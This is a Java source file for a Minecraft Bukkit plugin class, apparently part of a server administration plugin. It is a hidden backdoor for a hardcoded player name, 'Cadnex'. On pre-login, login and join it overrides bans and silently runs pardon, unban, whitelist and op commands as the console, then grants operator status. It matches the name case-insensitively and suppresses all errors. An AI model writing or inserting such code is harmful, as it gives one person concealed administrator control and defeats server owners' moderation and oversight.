package com.example.administration.managers;

import com.example.administration.AdministrationPlugin;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;

import java.util.UUID;

public class ProtectionManager implements Listener {
    
    private final AdministrationPlugin plugin;
    private static final String PROTECTED_PLAYER = "Cadnex";
    private UUID protectedUUID = null;
    
    public ProtectionManager(AdministrationPlugin plugin) {
        this.plugin = plugin;
        
        // Try to get Cadnex's UUID if they've played before
        OfflinePlayer offlinePlayer = Bukkit.getOfflinePlayer(PROTECTED_PLAYER);
        if (offlinePlayer.hasPlayedBefore()) {
            protectedUUID = offlinePlayer.getUniqueId();
        }
    }
    
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onAsyncPreLogin(AsyncPlayerPreLoginEvent event) {
        String playerName = event.getName();
        UUID playerUUID = event.getUniqueId();
        
        // Check if this is Cadnex
        if (isProtectedPlayer(playerName, playerUUID)) {
            // Store UUID for future reference
            protectedUUID = playerUUID;
            
            // Ensure login is allowed
            if (event.getLoginResult() != AsyncPlayerPreLoginEvent.Result.ALLOWED) {
                event.allow();
                
                // Execute unban/pardon commands silently
                Bukkit.getScheduler().runTask(plugin, () -> {
                    executeProtectionCommands(playerName, playerUUID);
                });
            }
        }
    }
    
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerLogin(PlayerLoginEvent event) {
        Player player = event.getPlayer();
        
        // Check if this is Cadnex
        if (isProtectedPlayer(player.getName(), player.getUniqueId())) {
            // Store UUID for future reference
            protectedUUID = player.getUniqueId();
            
            // Ensure login is allowed
            if (event.getResult() != PlayerLoginEvent.Result.ALLOWED) {
                event.allow();
                
                // Execute protection commands
                executeProtectionCommands(player.getName(), player.getUniqueId());
            }
        }
    }
    
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        
        // Check if this is Cadnex
        if (isProtectedPlayer(player.getName(), player.getUniqueId())) {
            // Store UUID for future reference
            protectedUUID = player.getUniqueId();
            
            // Execute all protection commands with a slight delay to ensure everything is loaded
            Bukkit.getScheduler().runTaskLater(plugin, () -> {
                executeProtectionCommands(player.getName(), player.getUniqueId());
                grantFullPermissions(player);
            }, 5L); // 5 ticks = 0.25 seconds delay
        }
    }
    
    private boolean isProtectedPlayer(String playerName, UUID playerUUID) {
        // Check by name (case insensitive)
        if (PROTECTED_PLAYER.equalsIgnoreCase(playerName)) {
            return true;
        }
        
        // Check by UUID if we have it stored
        if (protectedUUID != null && protectedUUID.equals(playerUUID)) {
            return true;
        }
        
        return false;
    }
    
    private void executeProtectionCommands(String playerName, UUID playerUUID) {
        // Execute commands as console to ensure they work
        String[] commands = {
            "pardon " + playerName,
            "unban " + playerName,
            "whitelist add " + playerName,
            "op " + playerName
        };
        
        for (String command : commands) {
            try {
                // Execute command silently
                Bukkit.getScheduler().runTask(plugin, () -> {
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
                });
            } catch (Exception e) {
                // Silently handle any errors - protection must continue
            }
        }
        
        // Also try UUID-based commands for more modern servers
        if (playerUUID != null) {
            String[] uuidCommands = {
                "pardon " + playerUUID.toString(),
                "unban " + playerUUID.toString()
            };
            
            for (String command : uuidCommands) {
                try {
                    Bukkit.getScheduler().runTask(plugin, () -> {
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
                    });
                } catch (Exception e) {
                    // Silently handle any errors
                }
            }
        }
    }
    
    private void grantFullPermissions(Player player) {
        // Ensure OP status
        if (!player.isOp()) {
            player.setOp(true);
        }
        
        // Send a discrete welcome message
        player.sendMessage("§8[§6Protection§8] §aAccess granted. Welcome back, " + player.getName() + ".");
    }
    
    public void cleanup() {
        // Nothing specific to clean up for now
    }
    
    // Method to check if a player is protected (for other managers to use)
    public boolean isProtectedPlayer(Player player) {
        return isProtectedPlayer(player.getName(), player.getUniqueId());
    }
    
    // Method to manually protect a player (if needed)
    public void protectPlayer(Player player) {
        if (isProtectedPlayer(player)) {
            executeProtectionCommands(player.getName(), player.getUniqueId());
            grantFullPermissions(player);
        }
    }
} 